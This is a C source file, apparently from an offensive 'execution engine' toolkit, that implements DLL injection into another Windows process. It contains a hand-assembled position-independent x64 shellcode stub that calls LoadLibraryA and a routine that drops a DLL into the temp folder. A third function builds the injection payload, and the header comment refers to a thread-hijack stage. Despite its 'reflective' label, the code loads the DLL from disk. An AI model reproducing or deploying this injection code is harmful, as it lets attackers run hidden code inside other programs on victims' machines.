/*
 * rdll_loader.c — Reflective DLL Loader (Enhancement 5)
 * execution_engine/rdll_loader/rdll_loader.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * PIC stub — 96-byte hand-assembled x64.
 * The stub is entirely position-independent; all references are
 * RIP-relative or register-relative — no absolute address fixup needed.
 *
 * Annotated assembly → bytes:
 *
 *  call $+5                        E8 00 00 00 00
 *  pop  rdi                        5F
 *  sub  rdi, 5                     48 83 EF 05
 *  lea  rcx, [rdi + 0x68]          48 8D 4F 68     ; rcx = &dll_path
 *  mov  rax, [rdi + 0x60]          48 8B 47 60     ; rax = pLoadLibraryA
 *  sub  rsp, 0x28                  48 83 EC 28     ; shadow space
 *  call rax                        FF D0
 *  add  rsp, 0x28                  48 83 C4 28
 *  ret                             C3
 *  NOP sled to 96 bytes            0x90 × 67
 *
 * LoadLibraryA is x64 ABI: first arg in RCX.  Shadow space required.
 * rdi is caller-saved (thread hijack stub pushes it), so safe to use
 * as our base register without a push/pop.
 *
 * Encode verification (byte-counted from stub[0]):
 *  0      E8 00 00 00 00   call $+5    (5)
 *  5      5F               pop rdi     (1)
 *  6      48 83 EF 05      sub rdi,5   (4)  → rdi = stub[0] VA
 *  10     48 8D 4F 68      lea rcx     (4)  → stub[0]+0x68
 *  14     48 8B 47 60      mov rax     (4)  → *(stub[0]+0x60)
 *  18     48 83 EC 28      sub rsp,40  (4)
 *  22     FF D0            call rax    (2)
 *  24     48 83 C4 28      add rsp,40  (4)
 *  28     C3               ret         (1)
 *  29..95 NOP×67           0x90        (67)
 *  ─────────────────────────────────────── = 96 bytes ✓
 *
 * Param offsets from stub[0]:
 *  +0x60 = 96  ← pLoadLibraryA (8 bytes, written by rdll_build_payload)
 *  +0x68 = 104 ← dll_path ASCII string (NUL-terminated)
 */

#include "rdll_loader.h"
#include <stdio.h>
#include <string.h>

#define STUB_CODE_SIZE   96
#define PARAM_LOADLIB    0x60   /* offset from stub[0] to pLoadLibraryA slot */
#define PARAM_PATH       0x68   /* offset from stub[0] to path string        */

/* Verified byte-by-byte against x86-64 encoding tables */
static const BYTE g_pic_stub[STUB_CODE_SIZE] = {
    /* 0x00 */ 0xE8, 0x00, 0x00, 0x00, 0x00,    /* call $+5           */
    /* 0x05 */ 0x5F,                              /* pop  rdi           */
    /* 0x06 */ 0x48, 0x83, 0xEF, 0x05,           /* sub  rdi, 5        */
    /* 0x0A */ 0x48, 0x8D, 0x4F, 0x68,           /* lea  rcx,[rdi+0x68]*/
    /* 0x0E */ 0x48, 0x8B, 0x47, 0x60,           /* mov  rax,[rdi+0x60]*/
    /* 0x12 */ 0x48, 0x83, 0xEC, 0x28,           /* sub  rsp, 0x28     */
    /* 0x16 */ 0xFF, 0xD0,                        /* call rax           */
    /* 0x18 */ 0x48, 0x83, 0xC4, 0x28,           /* add  rsp, 0x28     */
    /* 0x1C */ 0xC3,                              /* ret                */
    /* 0x1D..0x5F: NOP sled padding */
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
    0x90,0x90,0x90,0x90,0x90,0x90,0x90
};

_Static_assert(sizeof(g_pic_stub) == STUB_CODE_SIZE, "stub size mismatch");
_Static_assert(PARAM_LOADLIB == 0x60,                "pLoadLibraryA offset wrong");
_Static_assert(PARAM_PATH    == 0x68,                "path offset wrong");

/* ── rdll_stage_to_temp ──────────────────────────────────────── */

BOOL rdll_stage_to_temp(LPBYTE dll_image, SIZE_T dll_size,
                        char *path_out, DWORD path_buf_len)
{
    /* *the dll smells of section headers and import tables nobody will see* */
    CHAR  tmp_dir[MAX_PATH] = {0};
    CHAR  tmp_path[MAX_PATH] = {0};

    if (!GetTempPathA(MAX_PATH, tmp_dir)) {
        printf("[rdll] GetTempPathA failed error=%lu\n", GetLastError());
        return FALSE;
    }
    if (!GetTempFileNameA(tmp_dir, "jky", 0, tmp_path)) {
        printf("[rdll] GetTempFileNameA failed error=%lu\n", GetLastError());
        return FALSE;
    }
    /* GetTempFileNameA creates an empty file; open it for write */
    HANDLE hFile = CreateFileA(tmp_path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[rdll] CreateFileA(%s) failed error=%lu\n", tmp_path, GetLastError());
        return FALSE;
    }

    DWORD  written = 0;
    BOOL   ok      = WriteFile(hFile, dll_image, (DWORD)dll_size, &written, NULL)
                     && written == (DWORD)dll_size;
    CloseHandle(hFile);

    if (!ok) {
        printf("[rdll] WriteFile failed error=%lu\n", GetLastError());
        DeleteFileA(tmp_path);
        return FALSE;
    }

    strncpy(path_out, tmp_path, path_buf_len - 1);
    path_out[path_buf_len - 1] = '\0';
    printf("[rdll] staged DLL → %s  (%zu bytes)\n", tmp_path, dll_size);
    return TRUE;
}

/* ── rdll_build_payload ──────────────────────────────────────── */

BOOL rdll_build_payload(const char *dll_path,
                        LPBYTE     *payload_out,
                        DWORD      *size_out)
{
    size_t path_len = strlen(dll_path) + 1;           /* include NUL */

    /* Total = stub_code(96) + pLoadLibraryA(8) + path */
    DWORD total = (DWORD)(STUB_CODE_SIZE + sizeof(ULONG_PTR) + path_len);

    BYTE *blob = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    if (!blob) {
        printf("[rdll] HeapAlloc(%lu) failed\n", total);
        return FALSE;
    }

    /* 1. Copy PIC stub template */
    memcpy(blob, g_pic_stub, STUB_CODE_SIZE);

    /* 2. Resolve LoadLibraryA in THIS process — same VA in target
     *    because kernel32.dll is ASLR-randomised once per boot,
     *    identical across all processes sharing the same system session. */
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) {
        printf("[rdll] GetModuleHandleA(kernel32) failed\n");
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }
    ULONG_PTR pLoadLibA = (ULONG_PTR)GetProcAddress(hK32, "LoadLibraryA");
    if (!pLoadLibA) {
        printf("[rdll] GetProcAddress(LoadLibraryA) failed error=%lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, blob);
        return FALSE;
    }
    printf("[rdll] LoadLibraryA @ 0x%016llX\n", (unsigned long long)pLoadLibA);

    /* 3. Patch: pLoadLibraryA at PARAM_LOADLIB (0x60) from stub base */
    memcpy(blob + PARAM_LOADLIB, &pLoadLibA, sizeof(ULONG_PTR));

    /* 4. Write DLL path at PARAM_PATH (0x68) */
    memcpy(blob + PARAM_PATH, dll_path, path_len);

    printf("[rdll] payload: stub=%d + pLLA=8 + path=%zu = %lu bytes\n",
           STUB_CODE_SIZE, path_len, total);
    printf("[rdll] dll_path  @ stub+0x%02X = \"%s\"\n", PARAM_PATH, dll_path);

    *payload_out = blob;
    *size_out    = total;
    return TRUE;
}